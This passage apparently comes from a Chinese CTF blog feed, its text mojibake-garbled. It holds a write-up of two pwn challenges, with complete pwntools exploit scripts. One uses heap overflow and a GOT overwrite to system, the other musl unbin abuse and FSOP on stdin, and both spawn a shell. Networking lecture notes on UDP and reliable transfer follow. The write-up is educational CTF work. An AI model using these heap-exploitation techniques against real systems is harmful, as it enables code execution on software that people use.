alt="image-20230908181202295"></p><p>strspn_sse42çš„gotæ˜¯å¯å†™çš„å¯ä»¥åŠ«æŒä¸ºsystem</p><p><img src="/2023/09/07/2023-ycb/image-20230908181402318.png" alt="image-20230908181402318"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;1 &#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;3 &#x27;</span> + <span class="built_in">str</span>(index).encode() + <span class="string">b&#x27;:&#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;4 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;2 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14CB&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1955&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1509&#x27;)#mallco</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1667&#x27;)#delete</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x62</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">0x60</span>+<span class="string">b&quot;\xa0\x08&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&quot;b&quot;</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt: &#x27;</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-<span class="number">0x219c80</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libc_base)</span><br><span class="line">system=libc_base+libcelf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sl(<span class="string">b&#x27;1 &#x27;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219058</span>-<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x50</span>+p64(system))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>2.35 exitå‰åŠ é”å‡½æ•°å˜ä¸ºäº†pthread_mutex_lockï¼Œå­˜å‚¨åœ¨ ___rtld_mutex_lockä¸­ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€ä¸å¯å†™äº†</p><p><img src="/2023/09/07/2023-ycb/image-20230908183549480.png" alt="image-20230908183549480"></p><p><img src="/2023/09/07/2023-ycb/image-20230908183435298.png" alt="image-20230908183435298"></p><p>æˆ–è€…å¯ä»¥æ”¹elfçš„link_map-&gt;Elf64_Addr l_addrä½¿.finiå˜ä¸ºogg</p><p>æˆ–è€…å¯ä»¥é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œé€šè¿‡åç§»ä¿®æ”¹è¿”å›åœ°å€ä¸ºogg</p><h2 id="cookiebox"><a href="#cookiebox" class="headerlink" title="cookiebox"></a>cookiebox</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/2/c/t/P/cookieBox&gt; ./libc.so</span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br><span class="line">Usage: ./libc.so [options] [--] pathname [args]</span><br></pre></td></tr></table></figure><p>1.1.24 musl pwn è¿™ç¯‡æ–‡ç« æ¯”è¾ƒè¯¦ç»† <a href="https://www.anquanke.com/post/id/202253">https://www.anquanke.com/post/id/202253</a></p><p>patchæ–¹æ³•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./libc.so ./cookiebox</span><br></pre></td></tr></table></figure><p>deleteæ—¶å­˜åœ¨uafå¯ä»¥ï¼Œè™½ç„¶åœ¨editå’Œshowæ—¶è¿˜æœ‰ä¸ªå¤§å°æ£€æµ‹ï¼Œä½†æ˜¯åˆ©ç”¨ä¹‹å‰æ®‹ä½™çš„æŒ‡é’ˆæ¥é‡Šæ”¾ç°æœ‰çš„å †ï¼Œç»•è¿‡è¿™ä¸ªå¤§å°æ£€æµ‹</p><p>ç”³è¯·è¿‡ç¨‹ä¸­æœ‰ç±»ä¼¼glibcä¸­unlinkçš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L188-L213</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span><span class="comment">//cä¸ºè¦å–å‡ºçš„å †</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// è‹¥ bin åªæœ‰ä¸€ä¸ª chunkï¼Œå°† bin è®¾ä¸ºç©º bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// å–å‡ºé“¾è¡¨ä¸­çš„ chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// è®¾ç½® INUSE æ ‡å¿—ä½</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å®ç°å†™åœ°å€ï¼Œè¦†ç›–bin-&gt;headä¸ºstdin-0x20ï¼Œæ‰“FSOPå³å¯ï¼Œè¦æ³¨æ„stdin-0x10å’Œ-0x8å¤„å­˜æ”¾çš„åœ°å€è¦å¯å†™</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./cookieBox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the Content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400BB3&#x27;)#free</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x292e50</span></span><br><span class="line">stdin=libc+<span class="number">0x292200</span></span><br><span class="line">system=libc+<span class="number">0x42688</span></span><br><span class="line">heap=libc+ <span class="number">0x292b00</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#ä¸ºäº†ç”³è¯·stdinæ—¶ä»–çš„nextå’Œprecå¯å†™ åŒæ—¶ä¼šä½¿ä»–çš„bitmapä½ç½®é›¶</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stdin-<span class="number">0x20</span>) + p64(stdin-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)   <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">1</span>)   </span><br><span class="line">edit(<span class="number">4</span>, p64(heap) + p64(stdin - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span>    <span class="comment"># stdin-&gt;flags</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">32</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># stdin-&gt;wpos</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0xbeefdead</span>)  <span class="comment"># stdin-&gt;wbase</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(system)      <span class="comment"># stdin-&gt;write</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)<span class="comment">#7</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/09/07/2023-ycb/image-20230910004155958.png" alt="image-20230910004155958"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ:ä¼ è¾“å±‚</title>
      <link href="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h1><p>ä¼ è¾“å±‚åè®®åœ¨ç«¯ç³»ç»Ÿä¸­å®ç°è€Œä¸æ˜¯è·¯ç”±å™¨,ç®€å•èµ·è§æŠŠ<strong>è¿è¾“å±‚åˆ†ç»„ç§°ä¸ºæŠ¥æ–‡æ®µ</strong>ï¼Œ<strong>ç½‘ç»œå±‚åˆ†ç»„ç§°ä¸ºæ•°æ®æŠ¥</strong></p><p>UDPï¼ŒTCPçš„åŸºæœ¬è´£ä»»å°†ä¸¤ä¸ªç«¯ç³»ç»Ÿé—´IPçš„äº¤ä»˜æœåŠ¡æ‹“å±•åˆ°ç«¯ç³»ç»Ÿä¸Šä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„äº¤ä»˜æœåŠ¡</p><p>å°†ä¸»æœºé—´äº¤ä»˜æ‰©å±•åˆ°è¿›ç¨‹é—´äº¤ä»˜è¢«ç§°ä¸ºè¿è¾“å±‚çš„å¤šè·¯å¤ç”¨ä¸å¤šè·¯è§£å¤ç”¨</p><h2 id="å¤šè·¯å¤ç”¨ä¸å¤šè·¯è§£å¤ç”¨"><a href="#å¤šè·¯å¤ç”¨ä¸å¤šè·¯è§£å¤ç”¨" class="headerlink" title="å¤šè·¯å¤ç”¨ä¸å¤šè·¯è§£å¤ç”¨"></a>å¤šè·¯å¤ç”¨ä¸å¤šè·¯è§£å¤ç”¨</h2><ul><li>å¤šè·¯å¤ç”¨:ä»æºä¸»æœºä¸åŒå¥—æ¥å­—æ”¶é›†æ•°æ®å—ï¼Œå¹¶ä¸ºæ¯ä¸ªæ•°æ®å—å°è£…ä¸Šé¦–éƒ¨ä¿¡æ¯ç”ŸæˆæŠ¥æ–‡æ®µï¼ŒæŠ¥æ–‡æ®µæŠ•é€’åˆ°ç½‘ç»œå±‚</li><li>å¤šè·¯è§£å¤ç”¨:å°†ä¼ è¾“å±‚æŠ¥æ–‡æ®µçš„æ•°æ®äº¤ä»˜åˆ°æ­£ç¡®çš„å¥—æ¥å­—</li></ul><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><h3 id="æŠ¥æ–‡"><a href="#æŠ¥æ–‡" class="headerlink" title="æŠ¥æ–‡"></a>æŠ¥æ–‡</h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230905130551078.png" alt="image-20230905130551078"></p><p>ç«¯å£å·ï¼šé€šè¿‡ç«¯å£å·ç›®çš„ä¸»æœºå¯ä»¥å®ç°å¤šè·¯è§£å¤ç”¨</p><p>é•¿åº¦ï¼šUDPæŠ¥æ–‡ä¸­çš„å­—èŠ‚æ•°(UDP æŠ¥æ–‡å¤´å’Œ UDP æ•°æ®é•¿åº¦)</p><p>æ ¡éªŒå€¼ï¼šæ£€éªŒæ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦è¢«æŸåï¼ŒRFCä¸­æ ‡å‡†è¦æ±‚ï¼Œå‘é€ç«¯åº”è¯¥è®¡ç®—æ£€éªŒå’Œï¼Œæ¥æ”¶ç«¯å¯é€‰</p><ul><li>å‘é€æ–¹ï¼šå¯¹æŠ¥æ–‡æ®µçš„<strong>æ‰€æœ‰16bitå­—çš„å’Œ</strong>è¿›è¡Œ<strong>åç </strong>è¿ç®—ï¼Œå…¶ä¸­å’Œçš„æº¢å‡ºéƒ½è¢«å›å·(æŠŠè¿›ä½åŠ ä¸Šï¼Œå¦‚ä¸‰bitæ•° 110+011&#x3D;010)ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯æ ¡éªŒå€¼</li><li>æ¥æ”¶æ–¹ï¼šç®—å‡ºæŠ¥æ–‡æ®µçš„<strong>æ‰€æœ‰16bitå­—å¤–åŠ æ ¡éªŒç çš„å’Œï¼ŒåŒæ ·æº¢å‡ºéƒ½è¢«å›å·</strong>ï¼Œç»“æœæ˜¯1111 1111 1111 1111åˆ™æ•°æ®å®Œæ•´</li></ul><blockquote><p>æ®‹å­˜é”™è¯¯ï¼šè¿™ç§æ£€é”™æ˜¯æœ‰é™çš„ï¼Œä¼šå‡ºç°æœ‰äº›æ•°æ®é”™è¯¯ä½†æ˜¯å¾—åˆ°çš„æ ¡éªŒå’Œæ˜¯æ­£ç¡®çš„æƒ…å†µï¼Œå«åšæ®‹å­˜é”™è¯¯</p></blockquote><h2 id="å¯é æ•°æ®ä¼ è¾“åŸç†"><a href="#å¯é æ•°æ®ä¼ è¾“åŸç†" class="headerlink" title="å¯é æ•°æ®ä¼ è¾“åŸç†"></a>å¯é æ•°æ®ä¼ è¾“åŸç†</h2><ul><li><p>å‡è®¾ä¿¡é“ä¿è¯å‘é€åˆ†ç»„ï¼Œä¸ä¸¢å¤±åˆ†ç»„ï¼Œä¸”åˆ†ç»„æŒ‰ç…§å‘é€é¡ºåºè¢«æ¥æ”¶ï¼Œä½†æ˜¯åˆ†ç»„æ•°æ®å¯èƒ½å—æŸ</p><p><strong>ç®€å•çš„è§£å†³åŠæ³•</strong></p><p>å‘é€æ–¹å‘é€å®Œä¸€ä¸ªåˆ†ç»„åç­‰å¾…ï¼Œæ¥æ”¶æ–¹é€šè¿‡æ ¡éªŒå’Œæ¥ç¡®è®¤åˆ†ç»„å®Œæ•´æ€§ï¼Œå®Œæ•´åˆ™å›å¤<strong>è‚¯å®šç¡®å®š</strong>(Positive Acknowledgment,ACK)åˆ†ç»„é€šçŸ¥å‘é€æ–¹å‘é€ä¸‹ä¸€ä¸ªåˆ†ç»„ï¼Œå¦åˆ™å‘é€<strong>å¦å®šç¡®å®š</strong>(Negative Acknowledgment,NCK)åˆ†ç»„é€šçŸ¥å‘é€æ–¹é‡ä¼ å½“å‰åˆ†ç»„</p><p><strong>æ–°çš„é—®é¢˜ï¼šack&#x2F;nckå‡ºé”™æ€ä¹ˆåŠï¼Ÿ</strong></p><p>ç»™ack&#x2F;nckåŠ ä¸Šæ ¡éªŒå’Œï¼Œç»™åˆ†ç»„åŠ ä¸ª<strong>åºå·å­—æ®µ</strong>ï¼Œå‘é€æ–¹æ”¶åˆ°çš„åé¦ˆåˆ†ç»„ack&#x2F;nckå‡ºé”™æ—¶ï¼Œä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€ï¼Œéƒ½é‡ä¼ åˆ†ç»„ï¼Œæ¥æ”¶æ–¹æ ¹æ®åˆ†ç»„åºå·å’Œä¸Šæ¬¡åˆ†ç»„çš„åºå·æ¯”è¾ƒç»“æœæ¥åé¦ˆå‘é€æ–¹ï¼Œå¦‚æœæ¥æ”¶åˆ°çš„åºå·å’Œç­‰å¾…çš„åºå·ä¸ä¸€æ ·ï¼Œè¯æ˜ack&#x2F;nckåˆ†ç»„å‡ºé”™äº†ï¼Œåªéœ€è¦é‡ä¼ ä¸ªACKï¼Œå¹¶ä¸¢å¼ƒæ‰è¿™ä¸ªåˆ†ç»„å³å¯</p><p><strong>ä¸ä½¿ç”¨nck</strong></p><p>æ¥æ”¶ç«¯åœ¨æ¥æ”¶åˆ°é”™è¯¯åˆ†ç»„ä¸å‘é€ NAK, è€Œæ˜¯å¯¹ä¸Šæ¬¡æ­£ç¡®æ¥æ”¶çš„åˆ†ç»„å‘é€ä¸€ä¸ªACKï¼Œå‘é€æ–¹æ¥æ”¶åˆ°å¯¹åŒä¸€ä¸ªåˆ†ç»„çš„ä¸¤ä¸ªACKå°±çŸ¥é“æ²¡æœ‰æ­£ç¡®å‘é€è¯¥ackåˆ†ç»„çš„ä¸‹ä¸€ä¸ªåˆ†ç»„ </p><p>æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è¦ä¼ è¾“p0 p1 p2 ä¸‰ä¸ªåˆ†ç»„ï¼Œæ¥æ”¶æ–¹æ¥æ”¶åˆ°æ­£ç¡®çš„p0åå‘é€ACK 0è¡¨ç¤ºæ­£ç¡®æ¥æ”¶p0ï¼Œå‘é€æ–¹ç»§ç»­å‘é€p1ï¼Œå¦‚æœæ¥æ”¶æ–¹æ­£ç¡®æ¥æ”¶p1ï¼Œå‘é€ACK 1è¡¨ç¤ºæ­£ç¡®æ¥æ”¶ï¼Œå¦åˆ™å‘é€ACK 0è¡¨ç¤ºæ¥æ”¶P1å‡ºé”™</p><p>ä¸ä½¿ç”¨nckç®€åŒ–äº†æœºåˆ¶ï¼Œæ¥ä¸ºåé¢å®ç°æµæ°´çº¿pipelineåšå‡†å¤‡</p><p>ç»¼ä¸Šæ‰€è¿°çš„æ•ˆæœ </p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906114728476.png" alt="image-20230906114728476"></p></li></ul><ul><li><p>å‡è®¾ä¿¡é“å¯èƒ½ä¸¢å¤±åˆ†ç»„ï¼Œåˆ†ç»„æ•°æ®å¯èƒ½å—æŸ</p><p>å‘é€æ–¹é‡‡ç”¨è¶…æ—¶é‡ä¼ æœºåˆ¶ï¼Œå‘é€æ–¹å‘é€åˆ†ç»„åå¯åŠ¨å€’è®¡æ•°å®šæ—¶å™¨ï¼Œå®šæ—¶å™¨è¿‡æœŸåæ²¡æœ‰æ¥æ”¶åˆ°ackï¼Œå†æ¬¡å‘é€åˆ†ç»„ï¼Œå…¶ä¸­ackä¸¢å¤±å¸¦æ¥çš„å‘é€é‡å¤åˆ†ç»„ï¼Œå¯ä»¥é€šè¿‡åºå·æ¥å¤„ç†</p></li></ul><blockquote><p>å‡¡äº‹éƒ½è¦åšæœ€åçš„æ‰“ç®—</p></blockquote><h2 id="æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®"><a href="#æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®" class="headerlink" title="æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®"></a>æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®</h2><p>å…è®¸å‘é€æ–¹åœ¨æœªå¾—åˆ°å¯¹æ–¹ç¡®è®¤çš„æƒ…å†µä¸‹ä¸€æ¬¡å‘é€å¤šä¸ªåˆ†ç»„éœ€è¦çš„æ¡ä»¶</p><ul><li>å¢åŠ åºå·èŒƒå›´</li><li>å‘é€æ–¹ç¼“å­˜å·²å‘é€æœªç¡®å®šçš„å¤šä¸ªåˆ†ç»„ï¼šæœªå¾—åˆ°ç¡®è®¤ï¼Œå¯èƒ½éœ€è¦é‡ä¼ 